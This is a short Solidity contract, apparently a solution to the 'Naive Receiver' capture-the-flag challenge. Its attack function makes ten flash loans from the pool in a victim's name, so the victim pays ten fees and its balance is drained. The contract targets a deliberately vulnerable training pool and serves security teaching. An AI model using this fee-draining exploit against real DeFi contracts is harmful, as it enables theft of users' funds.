import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNativeReceiver {
    NaiveReceiverLenderPool pool;

    constructor(NaiveReceiverLenderPool _pool) {
        pool = _pool;
    }

    function attack(address victim) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}
